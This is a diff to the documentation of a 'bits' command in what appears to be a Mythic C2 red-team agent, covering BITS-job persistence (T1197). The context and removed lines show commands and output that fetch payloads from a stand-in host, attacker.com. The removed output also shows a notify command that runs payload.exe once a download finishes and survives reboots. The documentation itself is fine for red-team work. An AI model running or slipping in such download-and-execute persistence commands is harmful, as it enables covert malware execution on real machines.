@@ -45,42 +45,18 @@ bits -action persist -name "UpdateCheck" -url "http://attacker.com/data.dat" -pa
 bits -action cancel -name "WindowsUpdate"
 ```
 
-## Example Output
+## Output Format
 
-**List:**
-```
-[*] BITS Job Enumeration (T1197)
-[+] Found 2 BITS jobs
+**List** returns a JSON array of BITS jobs (rendered as a sortable table in the Mythic UI with color-coded states):
 
-Job ID                               Name                 State        Progress        Files
-----------------------------------------------------------------------------------------------------
-{6EC08B7E-790B-4FB2-A053-7E23011E1225} WindowsUpdate        Transferring 45% (2.3 MB)    0/1
-{0C43F924-0F8B-444A-A3DF-9AC1E120486E} UpdateCheck          Suspended    0/0 bytes       0/1
+```json
+[
+  {"job_id": "{6EC08B7E-...}", "name": "WindowsUpdate", "state": "Transferring", "bytes_transferred": 2411724, "bytes_total": 5242880, "files_transferred": 0, "files_total": 1},
+  {"job_id": "{0C43F924-...}", "name": "UpdateCheck", "state": "Suspended", "bytes_transferred": 0, "bytes_total": 0, "files_transferred": 0, "files_total": 1}
+]
 ```
 
-**Create:**
-```
-[*] BITS Download Job Created (T1197)
-[+] Job Name: WindowsUpdate
-[+] Job ID:   {6EC08B7E-790B-4FB2-A053-7E23011E1225}
-[+] URL:      http://attacker.com/payload.exe
-[+] Path:     C:\Users\Public\update.exe
-[+] Status:   Downloading
-```
-
-**Persist:**
-```
-[*] BITS Persistence Job Created (T1197)
-[+] Job Name:    UpdateCheck
-[+] Job ID:      {0C43F924-0F8B-444A-A3DF-9AC1E120486E}
-[+] URL:         http://attacker.com/data.dat
-[+] Local Path:  C:\Users\Public\data.dat
-[+] Notify Cmd:  C:\Users\Public\payload.exe
-[+] Status:      Downloading (command runs on completion)
-
-[!] The notification command will execute when the download completes.
-[!] BITS jobs survive reboots and run as the creating user.
-```
+**Create**, **persist**, and **cancel** actions return plain text status messages.
 
 ## Operational Notes
 
